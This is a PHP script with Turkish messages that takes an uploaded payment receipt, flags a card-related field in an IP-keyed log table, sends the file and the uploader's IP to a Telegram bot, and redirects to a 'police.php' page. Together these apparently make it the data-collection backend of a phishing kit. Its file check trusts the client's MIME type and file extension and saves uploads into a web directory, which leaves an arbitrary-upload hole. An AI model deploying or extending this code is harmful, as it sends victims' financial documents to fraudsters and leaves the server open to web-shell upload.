<?php
require_once __DIR__ . '/../inc/brain.php';
require_once __DIR__ . '/../inc/back_head.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_FILES['decont'])) {
    echo json_encode(['success' => false, 'message' => 'Geçersiz istek.']);
    exit;
}

$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$file = $_FILES['decont'];
$allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
$maxSize = 5 * 1024 * 1024;

if (!in_array($file['type'], $allowedTypes)) {
    echo json_encode(['success' => false, 'message' => 'Sadece JPEG, PNG veya PDF yükleyebilirsiniz.']);
    exit;
}

if ($file['size'] > $maxSize) {
    echo json_encode(['success' => false, 'message' => 'Dosya boyutu 5 MB\'ı geçemez.']);
    exit;
}

try {
    $check = $pdo->prepare("SELECT kart_skt FROM logs WHERE ip_address = ? ORDER BY log_time DESC LIMIT 1");
    $check->execute([$ip]);
    $row = $check->fetch(PDO::FETCH_ASSOC);
    if (!$row || $row['kart_skt'] != 1) {
        $update = $pdo->prepare("UPDATE logs SET kart_skt = 1 WHERE ip_address = ? ORDER BY log_time DESC LIMIT 1");
        $update->execute([$ip]);
    }
} catch (PDOException $e) {
    error_log("DB hata: " . $e->getMessage());
}

$uploadDir = __DIR__ . '/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

$ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
$fileName = 'dekont_' . time() . '.' . $ext;
$targetPath = $uploadDir . $fileName;

if (move_uploaded_file($file['tmp_name'], $targetPath)) {
    if (!empty($botToken) && !empty($chatId)) {
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendDocument";
        $cfile = new CURLFile($targetPath, $file['type'], $fileName);
        $postFields = [
            'chat_id' => $chatId,
            'document' => $cfile,
            'caption' => "Yeni dekont yüklendi.\nDosya: {$fileName}\nBoyut: " . round($file['size']/1024, 2) . " KB\nIP: {$ip}"
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $result = curl_exec($ch);
        curl_close($ch);
    }
    header("Location: ../police.php");
    exit;
} else {
    echo json_encode(['success' => false, 'message' => 'Yükleme sırasında hata oluştu.']);
    exit;
}
?>
